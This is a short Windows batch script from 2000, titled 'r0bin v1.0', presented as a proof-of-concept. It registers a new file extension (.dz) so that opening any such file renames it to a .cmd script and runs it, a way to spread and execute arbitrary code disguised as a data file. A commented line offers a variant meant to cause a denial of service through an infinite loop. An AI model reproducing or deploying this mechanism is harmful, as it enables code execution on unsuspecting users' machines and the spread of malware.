@echo off
cls

rem --------------------------------------------
rem r0bin v1.0 - 2000/10/22
rem Nemo@deepzone.org
rem 
rem To my beloved girl. I love you more than I
rem can say. Wish I could give you all my life.
rem
rem Script description:
rem   Automatic registration of a new file type
rem   for the current user profile.
rem 
rem Files required:
rem   associate-nt4.exe - NT4 Resource Kit
rem   associate-w2k.exe - Win2k Resource Kit
rem
rem IMPORTANT NOTES:
rem   This script is not a trojan horse nor an
rem   i-worm. It is a 'proof-of-concept' to
rem   show a new way to spread and run
rem   potentially harmful code on any Windows
rem   machine.
rem --------------------------------------------

rem Script variables
  rem set CMD2run="cmd /c" ;Useful to create a DoS. This generates an infinite loop.
  set CMD2run="cmd /c move /y %%1 r0bin-m4rian.cmd && r0bin-m4rian.cmd"
  set ToolsDir=e:\data\deepzone\tests
  set OStype=Win2k

rem Installing r0bin head
  if not exist "%SystemDrive%\Documents and Settings" set OStype=NT4

  if %OStype% == NT4   %ToolsDir%\associate-nt4.exe .dz %CMD2run% /q /f > nul
  if %OStype% == Win2k %ToolsDir%\associate-w2k.exe .dz %CMD2run% /q /f > nul
  
rem Releasing script variables
  set CMD2run=
  set ToolsDir=
  set OStype=

  